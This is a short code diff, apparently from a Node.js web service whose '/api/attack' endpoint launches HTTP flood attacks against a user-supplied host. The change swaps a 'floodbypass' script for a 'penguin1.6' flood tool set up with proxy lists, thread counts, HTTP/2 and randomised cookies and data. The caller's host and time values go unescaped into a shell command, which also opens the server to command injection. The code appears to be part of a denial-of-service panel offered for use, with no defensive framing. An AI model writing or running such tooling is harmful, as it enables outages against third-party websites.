@@ -102,7 +102,7 @@ app.get("/api/attack", (req, res) => {
   };
 
   if (method.toLowerCase() === "rapid") {
-    executeCommand(`node floodbypass ${host} ${time} 5 3 http.txt rand`, 
+    executeCommand(`node penguin1.6 --method GET --target ${host} --time ${time} --rate 5 --threads 3 --proxy http.txt --http 2 --full true --extra true --referer ${host} --data RAND --cookie RAND`, 
     () => {}
     );
   }
